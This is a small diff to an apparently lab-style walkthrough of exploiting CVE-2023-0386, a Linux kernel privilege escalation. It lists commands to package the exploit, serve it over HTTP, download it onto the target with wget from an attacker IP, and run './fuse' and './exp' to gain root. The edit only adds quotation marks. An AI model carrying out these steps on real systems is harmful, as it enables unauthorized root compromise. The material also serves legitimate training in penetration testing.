@@ -43,6 +43,6 @@
 - **tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386** to make it compressed
 - **python -m http.server** to send files
 - **cd temp --> wget 10.10.16.63:8000/CVE-2023-0386.tar.bz2 --> tar -xjvf CVE-2023-0386.tar.bz2 -- >cd CVE-2023-0386** -- >
-- **./fuse ./ovlcap/lower ./gc** ---------> **./exp**  AND we ARE ROOOOOOOOOOOOT ..
+- " **./fuse ./ovlcap/lower ./gc** " --------->  " **./exp** "  AND we ARE ROOOOOOOOOOOOT ..
 - 
 
